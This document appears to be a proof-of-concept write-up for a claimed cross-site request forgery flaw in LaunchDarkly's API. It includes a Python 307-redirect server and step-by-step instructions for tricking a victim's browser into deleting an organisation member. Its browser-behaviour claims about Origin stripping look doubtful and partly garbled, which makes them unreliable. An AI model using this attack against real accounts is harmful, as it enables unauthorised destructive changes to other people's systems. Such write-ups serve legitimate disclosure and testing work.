🚨 LaunchDarkly CSRF Proof of Concept

CRITICAL CONFIRMED via cURL Browser: requires 307 redirect

Vulnerability: LD's Origin validation is bypassed when the Origin header is entirely absent. The API docs state: "LaunchDarkly validates that the Origin header...must match https://app.launchdarkly.com" — but this check only runs when the header IS present. When Origin is missing, any state-changing operation succeeds cross-origin.

📋 Steps to Reproduce

1️⃣ Set up a 307 redirect server (needed for browser-based exploit)

Modern browsers send Origin: https://attacker.com on cross-origin fetch/XHR → LD returns 403.

To bypass, we use a 307 redirect: The form POSTs to your server, which responds 307 → LD API. On the redirected request, Origin is stripped (varies by browser version).

# Python 307 redirect server — save as redirect307.py and run on your HTTPS server:
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
  def do_POST(self):
    target = "https://app.launchdarkly.com/api/v2/members/{MEMBER_ID}"
    self.send_response(307)
    self.send_header('Location', target)
    self.send_header('Access-Control-Allow-Origin', '*')
    self.end_headers()
  def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 443), H).serve_forever()

How it works:

  1. Victim visits https://your-server.com/ → auto-submits form POST
  2. Form POSTs to https://your-server.com/redirect
  3. Your server returns 307 (Temporary Redirect) → app.launchdarkly.com/api/v2/members/{ID}
  4. Browser follows redirect, preserves POST method & body
  5. On the redirected request, Origin is stripped (varies by browser)
  6. LD API accepts the request → 204 — member deleted
⚠ Browser compatibility note: Chrome 120+ strips Origin on cross-origin 307 redirect. Firefox strips Origin on all redirects. Safari keeps Origin. Test on the target's browser.
